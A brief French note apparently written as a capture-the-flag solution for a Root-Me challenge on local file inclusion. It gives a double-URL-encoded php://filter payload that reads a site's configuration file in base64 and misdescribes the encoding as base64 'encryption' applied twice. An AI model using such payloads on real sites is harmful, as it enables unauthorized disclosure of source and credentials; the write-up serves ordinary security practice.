# Local File Inclusion - Double encoding

sources utile : https://owasp.org/www-community/Double_Encoding <br>
solution : http://challenge01.root-me.org/web-serveur/ch45/index.php?page=php%253A%252F%252Ffilter%252Fconvert%252Ebase64-encode%252Fresource%253Dconf <br>
il faut chiffrer en base64 2 fois pour que le site accepte <br>
exemple : **'.'** = %2E et **'%'** = %25 -> %252E